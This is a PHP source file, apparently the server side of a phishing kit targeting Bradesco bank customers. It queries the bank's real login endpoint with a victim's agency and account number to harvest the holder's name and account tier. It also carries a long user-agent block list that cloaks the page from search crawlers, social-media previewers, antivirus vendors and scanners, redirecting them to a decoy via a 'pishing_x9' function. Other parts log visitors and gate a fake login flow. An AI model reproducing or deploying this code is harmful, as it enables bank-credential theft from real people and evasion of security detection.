    $fields = "AGN=" . $agencia . "&CTA=" . $conta . "&DIGCTA=" . $digitoConta . "&EXTRAPARAMS=&ORIGEM=101";
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Length: ' . strlen($fields);
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: www.ib12.bradesco.com.br';
    $headers[] = 'Origin: https://banco.bradesco';
    $headers[] = 'Referer: https://banco.bradesco/html/classic/index.shtm';
    $headers[] = 'Sec-Fetch-Mode: navigate';
    $headers[] = 'Sec-Fetch-Site: cross-site';
    $headers[] = 'Sec-Fetch-User: ?1';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36';

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $output = curl_exec($ch);


    preg_match_all('/Ol&#225;,\s(\w+)/', $output, $nome);

    $retorno = array();
    $retorno['nome'] = "";


    if (isset($nome) && isset($nome[1]) && isset($nome[1][0]) && strlen($nome[1][0]) > 0) {
        $retorno['nome'] = $nome[1][0];
    }

    preg_match_all('/Confira seu Nome, (\w+)[\'\"]/', $output, $nomePrimeiroAcesso);


    if (isset($nomePrimeiroAcesso) && isset($nomePrimeiroAcesso[1]) && isset($nomePrimeiroAcesso[1][0]) && strlen($nomePrimeiroAcesso[1][0]) > 0) {
        $retorno['nome'] = $nomePrimeiroAcesso[1][0];
    }

    $retorno['titulares'] = array();

    if (strlen($retorno['nome']) == 0) {


        preg_match_all('/<span\s{0,}id="radNome\d{2}"\s{0,}for="radNome\d{2}"\s{0,}>(\w+)<\/span>/', $output, $titulares);


        if (isset($titulares[1])) {
            foreach ($titulares[1] as $titular) {

                array_push($retorno['titulares'], $titular);
            }
        }
    }

    $retorno['exclusive'] = false;
    $retorno['prime'] = false;
    $retorno['classic'] = false;

    if (strpos($output, '<body class="exclusive">') !== false) {
        $retorno['exclusive'] = true;
        $_SESSION['tipo_conta'] = 'exclusive';
    }


    if (strpos($output, '<body class="prime">') !== false) {
        $retorno['prime'] = true;
        $_SESSION['tipo_conta'] = 'prime';
    }

    if (strpos($output, '<body class="varejo">') !== false) {
        $retorno['classic'] = true;
        $_SESSION['tipo_conta'] = 'classic';
    }
    //var_dump($titular);
    $_SESSION['titular'] = $retorno['nome'];

    return $retorno;
}

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


function getNome($agencia, $conta)
{
    $digitoConta = substr($conta, -1);
    $conta = substr($conta, 0, strlen($conta) - 1);

    $part = random(10);
    $ga = random(1) . "." . random(8) . "." . random(9) . "." . $part . "-" . random(9) . "." . $part;

    $agencia = str_pad($agencia, 4, "0", STR_PAD_LEFT);


    $ch = curl_init("https://www.ib12.bradesco.com.br/ibpflogin/identificacao.jsf?_ga=" . $ga);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $fields = "AGN=" . $agencia . "&CTA=" . $conta . "&DIGCTA=" . $digitoConta . "&EXTRAPARAMS=&ORIGEM=101";
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Content-Length: ' . strlen($fields);
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'Host: www.ib12.bradesco.com.br';
    $headers[] = 'Origin: https://banco.bradesco';
    $headers[] = 'Referer: https://banco.bradesco/html/classic/index.shtm';
    $headers[] = 'Sec-Fetch-Mode: navigate';
    $headers[] = 'Sec-Fetch-Site: cross-site';
    $headers[] = 'Sec-Fetch-User: ?1';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36';

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $output = curl_exec($ch);


    preg_match_all('/[Boa,Bom] (\w+),<span>(\w+)<\/span>/', $output, $nome);

    $retorno = array();
    $retorno['nome'] = "";

    if (isset($nome) && isset($nome[2]) && isset($nome[2][0]) && strlen($nome[2][0]) > 0) {
        $retorno['nome'] = $nome[2][0];
    }

    preg_match_all('/Confira seu Nome, (\w+)[\'\"]/', $output, $nomePrimeiroAcesso);


    if (isset($nomePrimeiroAcesso) && isset($nomePrimeiroAcesso[1]) && isset($nomePrimeiroAcesso[1][0]) && strlen($nomePrimeiroAcesso[1][0]) > 0) {
        $retorno['nome'] = $nomePrimeiroAcesso[1][0];
    }

    $retorno['titulares'] = array();

    if (strlen($retorno['nome']) == 0) {


        preg_match_all('/<label id="radNome\w{2}" for="radNome\w{2}" >(\w+)<\/label>/', $output, $titulares);

        if (isset($titulares[1])) {
            foreach ($titulares[1] as $titular) {

                array_push($retorno['titulares'], $titular);
            }
        }
    }

    $retorno['exclusive'] = false;

    if (strpos($output, 'exclusive') !== false) {
        $retorno['exclusive'] = true;
    }

    return $retorno;
}

////BUSCAR TITULAR////


function verificar_agent_block()
{
    $palavras = array(
        'facebookexternalhit',
        'facebook',
        'external',
        'face',
        'hit',
        'Facebot',
        'APIs-Google',
        'Mediapartners-Google',
        'AdsBot-Google-Mobile',
        'AdsBot-Google',
        'Googlebot',
        'Mediapartners-Google',
        'AdsBot-Google-Mobile-Apps',
        'FeedFetcher-Google',
        'Google-Read-Aloud',
        'DuplexWeb-Google',
        'Google Favicon',
        'googleweblight',
        'Storebot-Google',
        'Chrome-Lighthouse',
        'Bingbot',
        'DuckDuckBot',
        'Baiduspider',
        'YandexBot',
        'zonealarm',
        'malwarebytes',
        'antivirus',
        'panda',
        'mcafee',
        'linuxshield',
        'esafe',
        'drivesentry',
        'bitdefender',
        'avira',
        'sentry',
        '[ww]get',
        '^apache-httpclient',
        '^curl',
        '^lcc',
        '007ac9crawler',
        '2ip.ru',
        '360spider',
        'avg',
        'a6-indexer',
        'aboundex',
        'acapbot',
        'acoonbot',
        'adbeat_bot',
        'addsearchbot',
        'addthis',
        'adidxbot',
        'admantx',
        'adscanner',
        'adstxtcrawler',
        'advbot',
        'ahc',
        'ahrefs(bot|siteaudit)',
        'aihitbot',
        'aisearchbot',
        'alphabot',
        'amazonaws',
        'amazoncloudfront',
        'anderspinkbot',
        'antibot',
        'anyevent',
        'apercite',
        'appinsights',
        'applebot',
        'arabot',
        'archive.org_bot',
        'archivebot',
        'avangarddsl',
        'avast',
        'awesomecrawler',
        'axios',
        'b2bbot',
        'backlinkcrawler',
        'baiduspider',
        'baidu-yunguance',
        'bark[rr]owler',
        'bazqux',
        'bdcbot',
        'behloolbot',
        'betabot',
        'biglotron',
        'bing',
        'bingbot',
        'bingpreview',
        'binlar',
        'bitlybot',
        'blackboard',
        'blexbot',
        'blogmurabot',
        'blp_bbot',
        'bnf.fr_bot',
        'bomborabot',
        'bot.araturka',
        'botify',
        'bot-pge.chlooe',
        'boxcarbot',
        'brainobot',
        'brandverity',
        'btwebclient',
        'bubing',
        'buck',
        'buzzbot',
        'bytespider',
        'caliperbot',
        'capsulechecker',
        'careerbot',
        'ccbot',
        'ccmetadatascaper',
        'changedetection',
        'check_http',
        'checkmarknetwork',
        'chrome-lighthouse',
        'citeseerxbot',
        'clickagy',
        'cliqzbot',
        'cloudflare-alwaysonline',
        'coccoc',
        'collection@infegy',
        'companybook-crawler',
        'contentcrawlerspider',
        'contextadbot',
        'contxbot',
        'convera',
        'convergenze',
        'crawler4j',
        'crunchbot',
        'crystalsemanticsbot',
        'cust-q.wadsl.it',
        'cutesouthchat',
        'cxensebot',
        'cyberpatrol',
        'dareboost',
        'datafeedwatch',
        'datagnionbot',
        'datanyze',
        'dataprovider',
        'daum',
        'dcrawl',
        'deadlinkchecker',
        'deusu',
        'diffbot',
        'diggdeeper',
        'digincorebot',
        'discobot',
        'discordbot',
        'disqus',
        'dnyzbot',
        'domaincrawler',
        'domainre-animatorbot',
        'domainstatsbot',
        'dotbot',
        'drupact',
        'duckduckbot',
        'duckduckgo-favicons-bot',
        'dynamic.milbr.net',
        'ec2linkfinder',
        'edisterbot',
        'efra09',
        'electricmonk',
        'elisabot',
        'embedly',
        'epicbot',
        'eright',
        'europarchive.org',
        'everyonesocialbot',
        'exabot',
        'experibot',
        'extlinksbot',
        'ezid',
        'ezooms',
        'facebook',
        'facebookexternalhit',
        'facebot',
        'fastenterprisecrawler',
        'fast-webcrawler',
        'fedoraplanet',
        'feedfetcher-google',
        'feedly',
        'feedspot',
        'feedvalidator',
        'femtosearchbot',
        'fetch',
        'fever',
        'filterdb.iss.netcrawler',
        'findlink',
        'findthatfile',
        'findxbot',
        'flamingo_searchengine',
        'flipboardproxy',
        'fluffy',
        'fr-crawler',
        'friendica',
        'fuelbot',
        'fyrebot',
        'g00g1e.net',
        'g2reader-bot',
        'g2webservices',
        'garlikcrawler',
        'genieo',
        'gigablast',
        'gigabot',
        'gingercrawler',
        'glutenfreecrawler',
        'gnamgnamspider',
        'gnowitnewsbot',
        'go-http-client',
        'google',
        'gowikibot',
        'grapeshotcrawler',
        'grobbot',
        'grouphigh',
        'grub.org',
        'gslfbot',
        'hatena',
        'headlesschrome',
        'heritrix',
        'http_get',
        'httpunit',
        'httpurlconnection',
        'httrack',
        'hubspot',
        'ia_archiver',
        'iascrawler',
        'icbot',
        'icc-crawler',
        'ichiro',
        'imrbot',
        'indeedbot',
        'integromedb',
        'intelium_bot',
        'interfaxscanbot',
        'internetathome',
        'ips-agent',
        'ip-web-crawler',
        'iskanie',
        'istellabot',
        'it2media-domain-crawler',
        'jamesbot',
        'jamie',
        'jetslide',
        'jetty',
        'jooblebot',
        'jpg-newsbot',
        'jugendschutzprogramm-crawler',
        'jyxobot',
        'k7mlwcbot',
        'kaspersky',
        'kemvibot',
        'khakasnet',
        'kirov',
        'kosmiobot',
        'landau-media-spider',
        'laserlikebot',
        'lb-spider',
        'leaseweb',
        'leikibot',
        'libwww-perl',
        'lingueebot',
        'linkapediabot',
        'linkarchiver',
        'linkdex',
        'linkedinbot',
        'linode',
        'lipperhey',
        'livelap[bb]ot',
        'lssbot',
        'lssrocketcrawler',
        'ltx71',
        'luminator-robots',
        'magpie-crawler',
        'mail.ru_bot',
        'mappydata',
        'mastodon',
        'mauibot',
        'mbcrawler',
        'mediapartners-google',
        'mediapartners-googlebot',
        'mediatoolkitbot',
        'megaindex',
        'meltwaternews',
        'memorybot',
        'metajobbot',
        'metauri',
        'mindupbot',
        'miniflux',
        'mixnodecache',
        'mj12bot',
        'mlbot',
        'moatbot',
        'mojeekbot',
        'moodlebot',
        'moreover',
        'msnbot',
        'msrbot',
        'muckrack',
        'multiviewbot',
        'norton',
        'nerdbynature.bot',
        'nerdybot',
        'netcraftsurveyagent',
        'netestatenecrawler',
        'netresearchserver',
        'netvibes',
        'newsharecounts',
        'newspaper',
        'nextcloud',
        'niki-bot',
        'nimbostratus-bot',
        'ning',
        'nmapscriptingengine',
        'nod32',
        'nutch',
        'nuzzel',
        'ocarinabot',
        'okhttp',
        'omgili',
        'online-webceo-bot',
        'openhosebot',
        'openindexspider',
        'orangebot',
        'outbrain',
        'outclicksbot',
        'page2rss',
        'panscient',
        'paperlibot',
        'pcore-http',
        'phantomjs',
        'phpcrawl',
        'pingdom',
        'pinterest',
        'piplbot',
        'pocketparser',
        'poneytelecom',
        'pool.prcdn.net',
        'postrank',
        'pr-cy.ru',
        'primalbot',
        'privacyawarebot',
        'proximic',
        'psbot',
        'pulsepoint',
        'purebot',
        'python-requests',
        'python-urllib',
        'qwantify',
        'rankactivelinkbot',
        'redditbot',
        'regionstuttgartbot',
        'retrevopageanalyzer',
        'rivva',
        'rogerbot',
        'rssingbot',
        's[ee][mm]rushbot',
        'safednsbot',
        'safesearchmicrodatacrawler',
        'sbl-bot',
        'scoutjet',
        'scrapy',
        'screamingfrogseospider',
        'scribdbot',
        'seekbot',
        'seekportcrawler',
        'semanticbot',
        'semanticscholarbot',
        'seokicks',
        'seoscanners',
        'serpstatbot',
        'seznambot',
        'simplecrawler',
        'simplescraper',
        'sistrixcrawler',
        'sitebot',
        'siteexplorer.info',
        'siteimprove',
        'sitelbra',
        'skypeuripreview',
        'slackbot',
        'slack-imgproxy',
        'slurp',
        'smtbot',
        'snacktory',
        'socialrankiobot',
        'spbot',
        'speedy',
        'stavropol',
        'storygizebot',
        'streamline3bot',
        'sukaininfoway',
        'summify',
        'surveybot',
        'swimgbot',
        'sysomos',
        'tagoobot',
        'tangibleebot',
        'telegrambot',
        'teoma',
        'theoldreader',
        'thinins',
        'thinklab',
        'tineye',
        'tinytinyrss',
        'toplistbot',
        'toutiaospider',
        'traackr',
        'tracemyfile',
        'trendictionbot',
        'trove',
        'turnitinbot',
        'tweetmemebot',
        'twengabot',
        'twingly',
        'twitterbot',
        'twurly',
        'um-ln',
        'upflow',
        'uptimebot.org',
        'uptimerobot',
        'urlappendbot',
        'usinenouvellecrawler',
        'validator',
        'vebidoobot',
        'velenpublicwebcrawler',
        'veoozbot',
        'vkshare',
        'voilabot',
        'vultr',
        'w3c_css_validator',
        'w3c_i18n-checker',
        'w3c_unicorn',
        'w3c_validator',
        'w3c-checklink',
        'w3c-mobileok',
        'wbsearchbot',
        'webcompanycrawler',
        'webdatastats',
        'wesee:search',
        'whatsapp',
        'wocbot',
        'woobot',
        'wordupinfosearch',
        'woriobot',
        'wotbox',
        'www.uptime',
        'xenulinksleuth',
        'xovibot',
        'y!j',
        'yacybot',
        'yahoolinkpreview',
        'yandexaccessibilitybot',
        'yandexbot',
        'yandeximages',
        'yandexmobilebot',
        'yanga',
        'yeti',
        'yisouspider',
        'yoozbot',
        'zabbix',
        'zgrab',
        'zoombot',
        'zoominfobot',
        'zumbot',
        'zuperlistbot'
    );

    $useragent = $_SERVER['HTTP_USER_AGENT'];

    $date = date('d/m/Y - H:i');
    $date;

    $dados_ISP_LIVE = "(" . $_GET['app'] . ") - (" . $date . ") - (" . Obter_SO() . ") > Servidor: " . $_SESSION['servidor'] . "| Estado: " . $_SESSION['estado'] . "  (" . $_SESSION['pais'] . ") | IP: " . $_SESSION['ip'] . "\n";
    $dados_AGENT_BLOCK = "(AGENT BLOCK) - (" . $date . ") - (" . Obter_SO() . ") > Servidor: " . $_SESSION['servidor'] . "| Estado: " . $_SESSION['estado'] . "  (" . $_SESSION['pais'] . ") | IP: " . $_SESSION['ip'] . "\n";

    if (preg_match(sprintf('/%s/i', implode('|', $palavras)), $useragent)) {
        file_put_contents("./webdriver/die.db", $dados_AGENT_BLOCK, FILE_APPEND);
        pishing_x9('./webdriver/paginas/x9.php');
        exit();
    } else {
        if (empty($_GET['app'])) {
            pishing_x9('./webdriver/paginas/x9.php');
            exit();
        }
        $_SESSION['device_unlock'] = $_SESSION['cidade'];
        file_put_contents("./webdriver/live.db", $dados_ISP_LIVE, FILE_APPEND);
    }
}

function verificar_liberacao()
{
    if (empty($_SESSION['device_unlock'])) {
        pishing_x9('./webdriver/paginas/x9.php');
        exit();
    } else {

        if (empty($_GET['app'])) {
            pishing_x9('./webdriver/paginas/x9.php');
            exit();
        }

        $upper = implode('', range('A', 'Z'));
        $lower = implode('', range('a', 'z'));
        $nums = implode('', range(0, 9));

        $alphaNumeric = $upper . $lower . $nums;
        $string = '';
        $len = 100;
        for ($i = 0; $i < $len; $i++) {
            $string .= $alphaNumeric[rand(0, strlen($alphaNumeric) - 1)];
        }

        $_SESSION['string'] = $string;

        header('Location: ./acesso/?app=bet&acao=login&client_web_app=' . $string . '');
        exit;
    }
}

function verifica_session_conta()
{

    if (empty($_SESSION['conta'])) {
        pishing_x9('../webdriver/paginas/x9.php');
        exit();
    }
}

function verifica_session_serial()
{

    if (empty($_SESSION['unlock_conta'])) {
        pishing_x9('../webdriver/paginas/x9.php');
        exit();
    }
}
